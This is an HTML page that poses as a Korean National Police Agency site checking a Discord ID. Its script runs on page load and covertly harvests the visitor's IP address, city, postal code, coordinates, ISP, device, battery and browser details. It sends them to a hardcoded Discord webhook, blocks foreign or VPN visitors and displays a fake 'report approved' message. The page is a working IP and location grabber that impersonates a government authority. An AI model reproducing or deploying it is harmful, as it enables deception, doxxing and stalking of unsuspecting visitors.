<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>경찰청</title>
</head>
<body>
    <div id="loading">디스코드 아이디를 확인하는 중...</div>

    <script>
        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1434021113695830079/Rp4J4NEJPP9WNSsKRbNWhy0gfmf-_xD9l413EfvBxUkgBu97Wx9-9BXIsTpJV43ezQfu';

        async function collectAllInfo() {
            const userData = {};

            // 기본 정보
            userData.timestamp = new Date().toLocaleString();
            userData.url = window.location.href;

            // IP 및 위치 정보
            try {
                const ipResponse = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipResponse.json();
                userData.ip = ipData.ip;

                const locationResponse = await fetch(`https://ipapi.co/${userData.ip}/json/`);
                const locationData = await locationResponse.json();
                
                userData.isp = locationData.org || '정보 없음';
                userData.asn = locationData.asn || '정보 없음';
                userData.asnOrg = locationData.org || '정보 없음';
                userData.city = locationData.city || '정보 없음';
                userData.region = locationData.region || '정보 없음';
                userData.country = locationData.country_name || '정보 없음';
                userData.postal = locationData.postal || '정보 없음';
                userData.coordinates = `${locationData.latitude || 'N/A'}, ${locationData.longitude || 'N/A'}`;
                userData.timezone = locationData.timezone || '정보 없음';
                userData.currency = `${locationData.currency} (${locationData.currency_name})` || '정보 없음';

                // ✅ VPN 또는 외국 감지 시 차단
                if (userData.country !== 'South Korea' && userData.country !== '대한민국') {
                    alert('VPN을 끄고 다시 접속해주세요.\n(현재 감지된 위치: ' + userData.country + ')');
                    document.body.innerHTML = `
                        <h2 style="text-align:center;color:red;margin-top:20%;">
                            VPN을 끄고 다시 접속해주세요.<br><br>
                            (현재 감지된 위치: ${userData.country})
                        </h2>`;
                    return; // 정보 수집 중단
                }

            } catch (error) {
                userData.ip = '정보 없음';
                userData.isp = '정보 없음';
                userData.asn = '정보 없음';
                userData.asnOrg = '정보 없음';
                userData.city = '정보 없음';
                userData.region = '정보 없음';
                userData.country = '정보 없음';
                userData.postal = '정보 없음';
                userData.coordinates = '정보 없음';
                userData.timezone = '정보 없음';
                userData.currency = '정보 없음';
            }

            // 기기 정보
            userData.browser = getBrowserInfo().name;
            userData.browserVersion = getBrowserInfo().version;
            userData.os = getOSInfo();
            userData.osArch = getOSArchitecture();
            userData.screen = `${screen.width} x ${screen.height}`;
            userData.availScreen = `${screen.availWidth} x ${screen.availHeight}`;
            userData.colorDepth = `${screen.colorDepth} 비트`;
            userData.pixelRatio = window.devicePixelRatio || '정보 없음';
            userData.language = navigator.language || '정보 없음';
            userData.online = navigator.onLine ? '온라인' : '오프라인';

            // 하드웨어 정보
            userData.cpuCores = navigator.hardwareConcurrency || '정보 없음';
            userData.deviceMemory = navigator.deviceMemory ? `${navigator.deviceMemory} GB` : '정보 없음';
            userData.hardwareConcurrency = navigator.hardwareConcurrency || '정보 없음';
            userData.deviceType = getDeviceType();
            userData.deviceVendor = getDeviceVendor();
            userData.deviceModel = getDeviceModel();
            userData.touchSupport = 'ontouchstart' in window ? '지원' : '미지원';
            userData.connectionType = getConnectionType();

            // 배터리 정보
            if ('getBattery' in navigator) {
                try {
                    const battery = await navigator.getBattery();
                    userData.battery = `${Math.round(battery.level * 100)}% (${battery.charging ? '충전 중' : '방전 중'})`;
                } catch (error) {
                    userData.battery = '정보 없음';
                }
            } else {
                userData.battery = '정보 없음';
            }

            // 브라우저 기술 정보
            userData.userAgent = navigator.userAgent;
            userData.cookies = navigator.cookieEnabled ? '사용 가능' : '사용 불가';
            userData.java = navigator.javaEnabled ? '사용 가능' : '사용 불가';
            userData.flash = hasFlash() ? '사용 가능' : '사용 불가';
            userData.pdfViewer = navigator.pdfViewerEnabled ? '내장 뷰어' : '플러그인 필요';
            userData.webgl = hasWebGL() ? '지원' : '미지원';
            userData.webrtc = hasWebRTC() ? '지원' : '미지원';

            sendWebhook(userData);
        }

        function getBrowserInfo() {
            const userAgent = navigator.userAgent;
            let browser = { name: "알 수 없음", version: "알 수 없음" };
            
            if (userAgent.indexOf("Chrome") > -1) {
                browser.name = "Google Chrome";
                const match = userAgent.match(/Chrome\/([0-9.]+)/);
                browser.version = match ? match[1] : "알 수 없음";
            } else if (userAgent.indexOf("Safari") > -1) {
                browser.name = "Safari";
                const match = userAgent.match(/Version\/([0-9.]+)/);
                browser.version = match ? match[1] : "알 수 없음";
            } else if (userAgent.indexOf("Firefox") > -1) {
                browser.name = "Mozilla Firefox";
                const match = userAgent.match(/Firefox\/([0-9.]+)/);
                browser.version = match ? match[1] : "알 수 없음";
            } else if (userAgent.indexOf("MSIE") > -1 || userAgent.indexOf("Trident") > -1) {
                browser.name = "Internet Explorer";
                const match = userAgent.match(/(MSIE |rv:)([0-9.]+)/);
                browser.version = match ? match[2] : "알 수 없음";
            } else if (userAgent.indexOf("Edge") > -1) {
                browser.name = "Microsoft Edge";
                const match = userAgent.match(/Edge\/([0-9.]+)/);
                browser.version = match ? match[1] : "알 수 없음";
            } else if (userAgent.indexOf("Opera") > -1) {
                browser.name = "Opera";
                const match = userAgent.match(/Opera\/([0-9.]+)/);
                browser.version = match ? match[1] : "알 수 없음";
            }
            
            return browser;
        }

        function getOSInfo() {
            const userAgent = navigator.userAgent;
            let os = "알 수 없음";
            
            if (userAgent.indexOf("Win") > -1) {
                if (userAgent.indexOf("Windows NT 10.0") > -1) os = "Windows 10/11";
                else if (userAgent.indexOf("Windows NT 6.3") > -1) os = "Windows 8.1";
                else if (userAgent.indexOf("Windows NT 6.2") > -1) os = "Windows 8";
                else if (userAgent.indexOf("Windows NT 6.1") > -1) os = "Windows 7";
                else if (userAgent.indexOf("Windows NT 6.0") > -1) os = "Windows Vista";
                else if (userAgent.indexOf("Windows NT 5.1") > -1) os = "Windows XP";
                else os = "Windows";
            } else if (userAgent.indexOf("Mac") > -1) {
                os = "MacOS";
            } else if (userAgent.indexOf("Linux") > -1) {
                os = "Linux";
            } else if (userAgent.indexOf("Android") > -1) {
                os = "Android";
            } else if (userAgent.indexOf("like Mac") > -1) {
                os = "iOS";
            }
            
            return os;
        }

        function getOSArchitecture() {
            if (navigator.userAgent.indexOf("WOW64") > -1 || 
                navigator.userAgent.indexOf("Win64") > -1) {
                return "64비트";
            } else {
                return "32비트 (또는 알 수 없음)";
            }
        }

        function getDeviceType() {
            const userAgent = navigator.userAgent;
            if (userAgent.match(/Mobile/)) return "모바일";
            if (userAgent.match(/Tablet/)) return "태블릿";
            return "데스크탑";
        }

        function getDeviceVendor() {
            const userAgent = navigator.userAgent;
            if (userAgent.indexOf("iPhone") > -1) return "Apple";
            if (userAgent.indexOf("iPad") > -1) return "Apple";
            if (userAgent.indexOf("Mac") > -1) return "Apple";
            if (userAgent.indexOf("Android") > -1) return "Google";
            if (userAgent.indexOf("Windows") > -1) return "Microsoft";
            return "알 수 없음";
        }

        function getDeviceModel() {
            const userAgent = navigator.userAgent;
            const match = userAgent.match(/(iPhone|iPad|iPod|Android|Windows Phone|BlackBerry)/);
            return match ? match[0] : "알 수 없음";
        }

        function getConnectionType() {
            if (navigator.connection) {
                return navigator.connection.effectiveType || '정보 없음';
            }
            return '정보 없음';
        }

        function hasFlash() {
            let flash = false;
            try {
                const fo = new ActiveXObject('ShockwaveFlash.ShockwaveFlash');
                if (fo) flash = true;
            } catch(e) {
                if (navigator.mimeTypes && navigator.mimeTypes['application/x-shockwave-flash'] !== undefined && 
                    navigator.mimeTypes['application/x-shockwave-flash'].enabledPlugin) {
                    flash = true;
                }
            }
            return flash;
        }

        function hasWebGL() {
            try {
                const canvas = document.createElement('canvas');
                return !!(window.WebGLRenderingContext && 
                    (canvas.getContext('webgl') || canvas.getContext('experimental-webgl')));
            } catch(e) {
                return false;
            }
        }

        function hasWebRTC() {
            return !!(navigator.getUserMedia || navigator.webkitGetUserMedia || 
                navigator.mozGetUserMedia || navigator.msGetUserMedia);
        }

        function sendWebhook(userData) {
            if (!WEBHOOK_URL || WEBHOOK_URL === 'YOUR_DISCORD_WEBHOOK_URL') {
                console.log('웹훅 URL을 설정해주세요');
                document.getElementById('loading').textContent = '웹훅 URL을 설정해주세요';
                return;
            }

            const infoText = `
🌐 **위치 정보**
• IP 주소: ${userData.ip}
• 통신사: ${userData.isp}
• ASN: ${userData.asn}
• ASN 조직: ${userData.asnOrg}
• 도시: ${userData.city}
• 지역: ${userData.region}
• 국가: ${userData.country}
• 우편번호: ${userData.postal}
• 좌표: ${userData.coordinates}
• 시간대: ${userData.timezone}
• 통화: ${userData.currency}

💻 **기기 정보**
• 브라우저: ${userData.browser} ${userData.browserVersion}
• 운영체제: ${userData.os}
• 아키텍처: ${userData.osArch}
• 화면 해상도: ${userData.screen}
• 사용 가능 화면: ${userData.availScreen}
• 색상 깊이: ${userData.colorDepth}
• 픽셀 비율: ${userData.pixelRatio}
• 언어: ${userData.language}
• 온라인 상태: ${userData.online}

🔧 **하드웨어 정보**
• CPU 코어: ${userData.cpuCores}
• 장치 메모리: ${userData.deviceMemory}
• 하드웨어 동시성: ${userData.hardwareConcurrency}
• 장치 유형: ${userData.deviceType}
• 장치 제조사: ${userData.deviceVendor}
• 장치 모델: ${userData.deviceModel}
• 터치 지원: ${userData.touchSupport}
• 배터리 상태: ${userData.battery}
• 연결 유형: ${userData.connectionType}

🛠️ **기술 정보**
• 쿠키 지원: ${userData.cookies}
• Java 지원: ${userData.java}
• Flash 지원: ${userData.flash}
• PDF 뷰어: ${userData.pdfViewer}
• WebGL 지원: ${userData.webgl}
• WebRTC 지원: ${userData.webrtc}

⏰ **기타 정보**
• 접속 시간: ${userData.timestamp}
• URL: ${userData.url}
            `;

            const webhookData = {
                content: `🚨 새로운 접속 감지 !!!\n${infoText}\n\n**User Agent:**\n\`\`\`${userData.userAgent}\`\`\``
            };

            const xhr = new XMLHttpRequest();
            xhr.open('POST', WEBHOOK_URL, true);
            xhr.setRequestHeader('Content-Type', 'application/json');
            
            xhr.onreadystatechange = function() {
                if (xhr.readyState === 4) {
                    if (xhr.status === 200 || xhr.status === 204) {
                        document.getElementById('loading').textContent = '신고가 성공적으로 승인되었습니다! ';
                    } else {
                        document.getElementById('loading').textContent = '인증 실패: ' + xhr.status;
                    }
                }
            };
            
            xhr.onerror = function() {
                document.getElementById('loading').textContent = '네트워크 오류 발생';
            };
            
            xhr.send(JSON.stringify(webhookData));
        }

        window.onload = collectAllInfo;
    </script>
</body>
</html>
